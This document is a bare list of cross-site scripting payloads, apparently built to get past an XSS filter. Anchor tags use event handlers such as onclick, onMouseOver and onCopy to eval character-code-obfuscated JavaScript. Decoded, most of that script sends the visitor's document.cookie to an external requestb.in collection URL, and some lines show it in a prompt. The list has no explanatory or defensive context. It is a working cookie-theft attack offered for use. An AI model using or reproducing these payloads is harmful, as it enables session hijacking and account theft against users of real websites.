xss filtered
============
alert :
<a onclick =eval/**/(prompt/**/(/x399x/))>xss11</a>

<a onclick =eval/**/(prompt/**/(String.fromCharCode(88,83,83)))>xss12</a>

<a onclick =eval/**/(prompt/**/(String.fromCharCode(88,83,83)))>xss12</a>


get cookie (eval(prompt(document.cookie))) :
<a onclick =eval/**/(String.fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59))>xss99</a>

<a onclick =eval/**/(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,112,122,116,104,111,112,112,122,34,59))>xss99</a>

ok ==> document.location ==> requestbin?c= + document.cookie
<a onclick =eval/**/(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,112,122,116,104,111,112,112,122,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))>xss111</a>


payload work with onMouseOver prompt cookie :
<a onMouseOver =eval/**/(String.fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59))>xss99</a>


<a class =myclass onMouseOver =eval/**/(String.fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59))>xss99</a>


<a onMouseOver =eval/**/(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,112,122,116,104,111,112,112,122,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))>xss2000</a>


<a onScroll =eval/**/(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,112,122,116,104,111,112,112,122,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))>xss2000</a>

<a onStart =eval/**/(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,112,122,116,104,111,112,112,122,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))>xss99</a>

<a onBegin =eval/**/(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,112,122,116,104,111,112,112,122,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))>xss99</a>

<a onFocusIn =eval/**/(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,112,122,116,104,111,112,112,122,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))>xss99</a>

<a onSelect =eval/**/(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,112,122,116,104,111,112,112,122,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))>xss999</a>

<a onUnload =eval/**/(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,112,122,116,104,111,112,112,122,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))>xss999</a>

<a onSelect =eval/**/(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,112,122,116,104,111,112,112,122,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))>xss999</a>

<a onStop =eval/**/(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,112,122,116,104,111,112,112,122,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))>xss999</a>

<a onKeyPress =eval/**/(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,112,122,116,104,111,112,112,122,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))>xss999</a>

<a onChange =eval/**/(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,112,122,116,104,111,112,112,122,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))>xss999</a>

<a onCopy =eval/**/(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,112,122,116,104,111,112,112,122,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))>xss999</a>

<a onBeforePrint =eval/**/(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,112,122,116,104,111,112,112,122,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))>xss999</a>

<a onBeforeEditFocus =eval/**/(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,112,122,116,104,111,112,112,122,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))>xss999</a>

<a onActivate =eval/**/(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,112,122,116,104,111,112,112,122,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59)"">xss999</a>

<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
